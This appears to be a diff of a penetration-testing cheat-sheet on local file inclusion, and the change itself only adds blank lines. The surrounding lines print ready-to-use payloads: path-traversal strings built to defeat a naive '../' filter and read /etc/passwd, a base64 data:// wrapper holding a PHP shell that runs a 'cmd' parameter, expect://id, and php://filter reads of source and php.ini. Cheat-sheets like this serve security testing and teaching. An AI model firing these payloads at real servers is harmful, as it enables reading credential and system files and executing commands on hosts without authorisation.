@@ -520,7 +520,9 @@ https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-f
 $language = str_replace('../', '', $_GET['file']);
 
 /....//....//....//....//etc/passwd
+  
 ..././..././..././..././etc/paswd
+  
 ....\/....\/....\/....\/etc/passwd
 
 #### Block . and /
@@ -536,9 +538,11 @@ $language = str_replace('../', '', $_GET['file']);
 #### PHP Wrappers
 
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+  
 expect://id
 
 php://filter/read=convert.base64-encode/resource=index.php
+  
 php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
 
 #### Filter PHP
